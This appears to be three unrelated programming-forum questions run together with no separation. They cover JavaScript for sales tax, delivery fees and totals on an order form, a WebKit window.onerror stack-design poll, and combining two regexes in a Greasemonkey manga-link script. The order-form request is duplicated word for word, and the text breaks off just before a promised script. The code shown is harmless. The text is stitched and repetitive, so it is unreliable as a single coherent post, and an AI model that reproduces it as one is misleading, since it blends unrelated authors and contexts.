And I need a field that show the tax amount that was calculated for the price they selected in page 2.

Lastly, I need to add a field to show the total sum. So it should look like this on the final page:

1. Qty
2. Price (installed or not installed)
3. Delivery fee (only if order under $50)
4. Sales tax
5. Total Price

also a hidden field of ""qty"" is sent form page 2 to show the total number of items they ordered. (its only one item type they are purchasing).

I need a javascript on that second page. 

When the user clicks whichever price (button, installed or not installed) , the javascript needs to do two things :

1. Calculate a sales tax of 6% (to be sent to final order page)
2. add a delivery cost of $10 unless the amount is over $50. (before tax price is added)
 
I need to post the price to the last page still as the ""amount"" as it currently does now, but I need to add a field to the final page that shows the delivery fee field ONLY if the delivery fee applies, other wise the amount should be $0.00

And I need a field that show the tax amount that was calculated for the price they selected in page 2.

Lastly, I need to add a field to show the total sum. So it should look like this on the final page:

1. Qty
2. Price (installed or not installed)
3. Delivery fee (only if order under $50)
4. Sales tax
5. Total Price

I looked here and this is similar what I need, but I don't want the on window alert and I don't know the proper syntax for my specific need.

The unfortunate thing is that they implemented it without the ability to inspect the error and no call stack looping capability (like IE). Although they implemented as per html5 specification,  the lack of a stack makes it close to useless for cross browser code.

The question I wanted to ask is what would you prefer if you had to choose between one of the two options:

 1) Error with stack parameter
     - Error is machine parsable like mozilla
     - stack would contain url, function and line number like moz
     - Adv: Error inspection, Simple stack parsing, Source files, Line numbers
     - Dis: No arguments inspection

 2) Call stack that chains back through to top calls
     - This is how IE works
     - Use arguments.callee.caller to loop up
     - Adv: can inspect arguments up the call stack
     - Dis: No source file names, No line numbers

Your input is greatly appreciated. I will post results back to WebKit folks to see if they can close the window.onerror for good.

Hello Everyone,

I've got a question about accomplishing something in regular expressions i.e is it possible and if so how.

Mind you regular expressions start to make my head spin after a while :-P

Short synopsis of what I am doing:

>I read Manga online (took Japanese in high school got addicted...) 

>I like to open up the current issue in a new tab but I don't always remember to click the link with a middle click

>So I decided to write a Greasemonkey script that would run on any of the sites pages adding a target=""_blank"" to any anchor tag that references a manga or an issue of that manga so a regular click would open it in a new tab.

>The script itself is working fine nothing spectacular about it

Now on to I'll call it the caveat 

>The link patterns we'll call it for each manga is as follows

        <language of manga>/<manga name> 
          links to the main about page for the manga

        <language of manga>/<manga name>/<issue number> 
          links to the issue number itself

        <language of manga>/<manga name>/<issue number>/<page number> 
          links to the specific page of the issue

Now I want it to always make the first two open in a new tab but I do NOT want the last one to open in a new tab. The reason for this is when reading the actual manga each click to advance the page would open a new tab.

So to accomplish this I have two regular expressions
<!-- language: lang-js -->

        var MangaIssueRegex = /en-manga\/[A-Za-z0-9\-]+\//;
        var MangaIssuePageRegex = /en-manga\/[A-Za-z0-9\-]+\/(\d+\/){2}/

The first regex picks up any of the three manga link patterns.
The second regex picks up only the third manga link pattern (the one for a specific page)

In a nutshell the greasemonkey script loops through all the anchor tags on the page when it loads and if the href attribute of the anchor tag passes the MangaIssueRegex AND fails the MangaIssuePageRegex the anchor tag is modified to open in a new tab otherwise the anchor tag is not modified.

Now is it possible to combine both regular expressions into a single one that will match the first two patterns but fail if the third pattern is encountered?

If so please explain how I would really love to expand my knowledge about regular expressions even if it is just a little at a time.

Thanks in advance for the help everyone.

Going to include the whole script just because I know someone usually asks to see it to help them give good advice.
